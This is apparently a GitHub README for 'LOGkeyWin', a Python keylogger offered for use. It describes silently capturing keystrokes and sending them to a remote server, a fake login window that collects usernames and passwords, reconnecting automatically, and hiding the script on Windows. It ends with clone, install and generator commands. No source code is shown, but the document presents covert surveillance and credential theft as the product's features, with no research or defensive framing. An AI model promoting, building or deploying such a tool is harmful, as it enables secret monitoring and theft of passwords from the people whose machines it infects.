# LOGkeyWin
# Keylogger Application

## Overview

The Keylogger Application is a Python-based tool that functions in two modes:
1. Silent Keylogger: Captures keystrokes and sends them to a remote server in the background.
2. Keylogger with Login Application: Provides a GUI login interface along with keystroke logging.

The application supports automatic reconnection to the server if the connection fails and can hide itself on Windows by setting specific file attributes.

## Features

- Silent Keylogger: Runs silently in the background and logs all keystrokes.
- GUI Login Application: Displays a login interface where users can input their username and password.
- Automatic Reconnection: Reconnects to the server every 5 seconds if the connection is lost.
- Self-Hiding Functionality: On Windows, the script can hide itself using file attributes.

## Requirements

- Python 3.x: Ensure Python is installed on your system.
- Python Packages:
  - `pynput`: For capturing keyboard events.
  - `tkinter`: For the graphical user interface (GUI) in the login application.
  - `socket`: For network communication.
  - `subprocess`: For executing system commands.

## Installation

1. Clone the Repository:
   ```bash
   git clone https://github.com/POWERHSado/LOGkeyWin.git
   ```
2. Install Required Python Packages:
   ```bash
   pip install -r requirements.txt
3. Using the Generator
   ```bash
   cd LOGkeyWin
   pip install -r requirements.txt
   bash gen.sh

